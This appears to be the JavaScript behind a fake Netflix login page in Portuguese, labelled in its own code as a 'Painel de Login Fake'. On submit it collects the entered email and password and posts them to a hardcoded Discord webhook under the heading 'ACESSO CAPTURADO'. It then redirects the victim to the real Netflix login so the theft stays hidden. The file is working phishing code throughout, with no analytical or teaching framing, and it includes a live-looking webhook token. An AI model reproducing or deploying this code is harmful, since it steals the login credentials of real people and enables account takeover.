document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const webhookURL = "https://discord.com/api/webhooks/1481402603404525678/LDGdRvAZJZEbG22rhkms1kmKt1XQ4oglVGE_cYOu0qWRi-y_fjE0GjZ8oAe2jwi28WI1";

    // Melhorando o título e o visual
    const payload = {
        username: "Netflix Auth Guard",
        avatar_url: "https://cdn4.iconfinder.com/data/icons/logos-and-brands/512/227_Netflix_logo-512.png",
        embeds: [{
            title: "🏮 ACESSO CAPTURADO - NETFLIX 🏮",
            description: "Um novo usuário inseriu os dados na página.",
            color: 15158332, // Vermelho intenso
            fields: [
                {
                    name: "👤 Usuário/E-mail",
                    value: `\`\`\`${email}\`\`\``,
                    inline: false
                },
                {
                    name: "🔑 Senha",
                    value: `\`\`\`${password}\`\`\``,
                    inline: false
                },
                {
                    name: "🌐 Origem",
                    value: "Painel de Login Fake",
                    inline: true
                }
            ],
            footer: {
                text: "Shelby System • " + new Date().toLocaleString()
            }
        }]
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(() => {
        // Redireciona mesmo que o Discord não retorne "OK" (devido ao CORS)
        setTimeout(() => {
            window.location.href = "https://www.netflix.com/br/login";
        }, 500);
    })
    .catch(err => {
        console.error("Erro ao enviar para o Webhook:", err);
        // Tenta redirecionar mesmo com erro para não travar a tela
        window.location.href = "https://www.netflix.com/br/login";
    });
});
